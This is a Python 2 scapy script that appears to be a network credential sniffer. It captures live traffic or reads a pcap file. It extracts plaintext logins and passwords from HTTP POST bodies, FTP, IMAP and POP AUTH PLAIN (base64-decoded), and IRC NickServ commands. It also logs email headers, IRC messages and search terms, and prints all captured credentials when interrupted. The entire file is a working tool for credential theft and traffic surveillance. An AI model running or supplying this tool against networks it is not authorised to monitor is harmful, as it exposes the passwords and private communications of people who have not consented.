#!/usr/bin/env python2

from os import geteuid, devnull
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
from sys import exit
import argparse
import signal
from base64 import b64decode
from urllib import unquote
from subprocess import Popen, PIPE

DN = open(devnull, 'w')

def parse_args():
   """Create the arguments"""
   parser = argparse.ArgumentParser()
   parser.add_argument("-i", "--interface", help="Choose an interface")
   parser.add_argument("-v", "--verbose", help="Do not skip or truncate URLs", action='store_true')
   parser.add_argument("-p", "--pcap", help="Parse info from a pcap file; -p <pcapfilename>")
   return parser.parse_args()

class Parser:

    fragged = 0
    imapauth = 0
    popauth = 0
    ftpuser = None # Necessary since user and pass come in separate packets
    ircnick = None # Necessary since user and pass come in separate packets
    oldmheaders = []
    logins = {} # Printed on Ctrl-C
    # For concatenating fragmented packets
    prev_pkt = {6667:{}, # IRC
                143:{},  # IMAP
                110:{},  # POP3
                80:{},   # HTTP
                26:{},   # SMTP
                25:{},   # SMTP
                21:{}}   # FTP


    def __init__(self, args):
        self.args = args

    def pkt_sorter(self, pkt):
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            self.dest    = pkt[IP].dst
            self.src     = pkt[IP].src
            self.dport   = pkt[TCP].dport
            self.sport   = pkt[TCP].sport
            self.ack     = pkt[TCP].ack
            self.seq     = pkt[TCP].seq
            self.load    = str(pkt[Raw].load)

            if self.dport == 80 or self.sport == 80:
                """ HTTP """
                port = 80
                # Catch fragmented pkts
                self.header_lines = self.hb_parse(port)
                return self.http_parser(port)

            elif self.dport == 6667:
                """ IRC """
                port = 6667
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                return self.irc(port)

            elif self.dport == 21 or self.sport == 21:
                """ FTP """
                port = 21
                self.prev_pkt[port] = self.frag_joiner(port) # No headers in FTP so no need for hb_parse
                self.ftp(port)

            elif self.dport == 25 or self.dport == 26:
                port = self.dport
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                self.email_parser('', 'Outgoing', '')

            elif self.sport == 110 or self.dport == 110:
                """ POP3 """
                port = 110
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                if self.dport == 110:
                    self.mail_pw(port)
                if self.sport == 110:
                    self.email_parser('+OK', 'Incoming', 'POP')

            elif self.sport == 143 or self.dport == 143:
                """ IMAP """
                port = 143
                self.header_lines = self.hb_parse(port) # Join fragmented pkts
                if self.dport == 143:
                    self.mail_pw(port)
                if self.sport == 143:
                    self.email_parser('BODY[]', 'Incoming', 'IMAP')

    def headers_body(self, protocol):
        try:
            h, b = protocol.split("\r\n\r\n", 1)
            return h, b
        except Exception:
            h, b = protocol, ''
            return h, b

    def frag_joiner(self, port):
        self.fragged = 0
        if len(self.prev_pkt[port]) > 0:
            if self.ack in self.prev_pkt[port]:
                self.fragged = 1
                return {self.ack:self.prev_pkt[port][self.ack]+self.load}
        return {self.ack:self.load}

    def hb_parse(self, port):
        self.prev_pkt[port] = self.frag_joiner(port)
        self.headers, self.body = self.headers_body(self.prev_pkt[port][self.ack])
        return self.headers.split('\r\n')

    def logins_check(self, port, user, pw):
        for ip in self.logins:
            if ip == self.src:
                for x in self.logins[ip]:
                    if x == (self.dest, port, user, pw):
                        return 1
                self.logins[ip].append((self.dest, port, user, pw))
                return 0
        self.logins[self.src] = [(self.dest, port, user, pw)]
        return 0


##################################################
#                    MAIL                        #
##################################################
    def email_parser(self, first_line, inout, proto):
        """The email module was not giving me what I wanted"""
        mail_header_finder = ['To: ', 'From: ', 'Date: ', 'Subject: ']
        mail_headers = []
        for h in self.header_lines:
            for x in mail_header_finder:
                if x in h:
                   mail_headers.append(h)
        if len(mail_headers) > 3:
            if first_line in self.header_lines[0] and self.body != '':
                # Prevent the headers from being repeated in output if msg is fragmented
                if mail_headers != self.oldmheaders:
                    self.oldmheaders = mail_headers
                    print '[%s] %s %s email:' % (self.src, inout, proto)
                    for m in mail_headers:
                        print '   ', m

    def mail_pw(self, port):
        load = self.load.strip('\r\n')

        if self.dport == 143:
            auth_find = 'authenticate plain'
            proto = 'IMAP'
            auth = self.imapauth
            self.imapauth = self.mail_pw_auth(load, auth_find, proto, auth, port)

        elif self.dport == 110:
            auth_find = 'AUTH PLAIN'
            proto = 'POP'
            auth = self.popauth
            self.popauth = self.mail_pw_auth(load, auth_find, proto, auth, port)

    def mail_pw_auth(self, load, auth_find, proto, auth, port):
        if auth == 1:
            user, pw = load, 0
            found = self.logins_check(port, user, pw)
            # This is slightly different from how we're printing HTTP user/pw and is so we don't spam
            # output with mail passwords which get sent frequently
            if found:
                return 0
            print '[%s] %s auth: %s' % (self.src, proto, load)
            self.b64decode(load, port)
            return 0

        elif auth_find in load:
            return 1

    def b64decode(self, load, port):
        b64str = load
        try:
            decoded = b64decode(b64str).replace('\x00', ' ')[1:] # delete space at beginning
        except Exception:
            decoded = ''
        # Test to see if decode worked
        if '@' in decoded:
            print '[%s] Decoded: %s' % (self.src, decoded)
            decoded = decoded.split()
            found = self.logins_check(port, decoded[0], decoded[1])

##################################################
#                    HTTP                        #
##################################################
    def http_parser(self, port):

        url = None
        host = self.search_headers('host: ')
        if host:
            get = self.search_headers('get /')
            post = self.search_headers('post /')
            if get:
                url = host+get
            elif post:
                url = host+post
        else:
            return

        if url:
            self.url_printer(url, post)

        if post:
            if self.body != '' and 'ocsp' not in host:
                if self.fragged:
                    print '[%s] POST load (frag): %s' % (self.src, self.body)
                else:
                    print '[%s] POST load: %s' % (self.src, self.body)

        # Print search terms
        searched = self.searches(url, host)
        if searched:
            print '[%s] Searched %s: %s' % (self.src, host, searched)

        self.http_user_pass(host, port)

    def http_user_pass(self, host, port):
        """Regex out the passwords and usernames
        If you think there's a good library for parsing load data I am here to tell you
        I have tried several suggestions and they are all less reliable than this way
        Feel free to prove otherwise"""
        # email, user, username, name, login, log, loginID
        user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        # password, pass, passwd, pwd, psw, passwrd, passw
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
        username = re.findall(user_regex, self.body)
        password = re.findall(pw_regex, self.body)
        user = None
        pw = None

        if username:
            for u in username:
                user = u[1]
                break

        if password:
            for p in password:
                if p[1] != '':
                    pw = p[1]
                    break

        if user:
            print '[%s > %s] login:    %s' % (self.src, host, user)
        if pw:
            print '[%s > %s] password: %s' % (self.src, host, pw)
            self.dest = host # So the destination will be saved as the hostname, not IP
            found = self.logins_check(port, user, pw)

    def url_printer(self, url, post):
        if not self.args.verbose:
            d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
            if any(i in url for i in d):
                return
            url = url[:135]

        if not self.fragged:
            if post:
                print '[%s] %s %s' % (self.src, 'POST', url)
            else:
                print '[%s] %s' % (self.src, url)

    def search_headers(self, header):
        for l in self.header_lines:
            if header in l.lower():
                line = l.split()
                try:
                    return line[1]
                except Exception:
                    return 0

    def searches(self, url, host):
        """ Find search terms from URLs. Prone to false positives but rather err on that side than false negatives
        search, query, ?s, &q, ?q, search?p, searchTerm, keywords, command """
        searched = re.search('((search|query|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
        if searched:
            searched = searched.group(3)

            # Common false positives
            if 'select%20*%20from' in searched:
                return 0
            if host == 'geo.yahoo.com':
                return 0

            # Decode URL encoding
            return unquote(searched).replace('+', ' ')


##################################################
#                     FTP                        #
##################################################
    def ftp(self, port):
        """Catch FTP usernames, passwords, and servers"""
        load = self.load.replace('\r\n', '')

        if port == self.dport:
            if 'USER ' in load:
                    user = load.strip('USER ')
                    print '[%s > %s] FTP user:    ' % (self.src, self.dest), user
                    self.ftpuser = user

            elif 'PASS ' in load:
                    pw = load.strip('PASS ')
                    print '[%s > %s] FTP password:' % (self.src, self.dest), pw
                    # Necessary since usernames and passwords come in separate packets
                    if self.ftpuser:
                        self.logins_check(port, self.ftpuser, pw)
                    else:
                        self.logins_check(port, '', pw)

        if 'authentication failed' in load:
            resp = load
            print '[%s > %s] FTP response:' % (self.src, self.dest), resp

        if '230 OK' in load:
            resp = load
            print '[%s > %s] FTP response:' % (self.src, self.dest), resp

##################################################
#                     IRC                        #
##################################################
    def irc(self, port):
        """Catch IRC nicks, passwords, joins, parts, quits, messages"""
        load = self.load.split('\r\n')[0]

        if 'NICK ' in load:
            self.ircnick = load.strip('NICK ')
            print '[%s > %s] IRC nick: %s' % (self.src, self.dest, self.ircnick)

        elif 'NS IDENTIFY ' in load:
            ircpass = load.strip('NS IDENTIFY ')
            print '[%s > %s] IRC password: %s' % (self.src, self.dest, ircpass)
            if self.ircnick:
                self.logins_check(port, self.ircnick, ircpass)
            else:
                self.logins_check(port, '', ircpass)

        elif 'PRIVMSG ' in load:
            load = load.split(' ', 2)
            ircchannel = load[1]
            ircmsg = load[2][1:] # Get rid of the beginning ":"
            print '[%s] IRC msg to %s: %s' % (self.src, ircchannel, ircmsg)

        elif 'JOIN ' in load:
            ircjoin = load.strip('JOIN ').split()[0] # There's a parameter x we need to get rid of with the split
            print '[%s > %s] IRC joined: %s' % (self.src, self.dest, ircjoin)

        elif 'PART ' in load:
            load = load.split()
            ircchannel = load[1]
            reason = load[2][1:]
            print '[%s > %s] IRC left %s: %s' % (self.src, self.dest, ircchannel, reason)

        elif 'QUIT ' in load:
            ircquit = load.strip('QUIT :')
            print '[%s > %s] IRC quit: %s' % (self.src, self.dest, ircquit)


##################################################
#                     MAIN                       #
##################################################
def main(args):

    if geteuid():
        exit('[-] Please run as root')

    parser = Parser(args)

    # Read from pcap file
    if args.pcap:
        pcap = rdpcap(args.pcap)
        for pkt in pcap:
            parser.pkt_sorter(pkt)
        print ''
        for k in parser.logins:
            for v in parser.logins[k]:
                print '%s: %s' % (k, v)
        exit('[*] Finished parsing pcap file')

    if args.interface:
       conf.iface = args.interface
    #Find the active interface
    else:
        try:
            ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
            for line in ipr.communicate()[0].splitlines():
                if 'default' in line:
                    l = line.split()
                    conf.iface = l[4]
                    break
        except Exception:
            exit('[-] Could not find an internet active interface; please specify one with -i <interface>')
    print '[*] Listening on %s, if you wish to change this specify the interface with the -i argument' % conf.iface

    def signal_handler(signal, frame):
        """This is nested inside main() so it can use parser.logins[k]
        Prints all the captured credentials"""
        print ''
        for k in parser.logins:
            for v in parser.logins[k]:
                print '%s: %s' % (k, v)
        exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    sniff(iface=conf.iface, prn=parser.pkt_sorter, store=0)


main(parse_args())

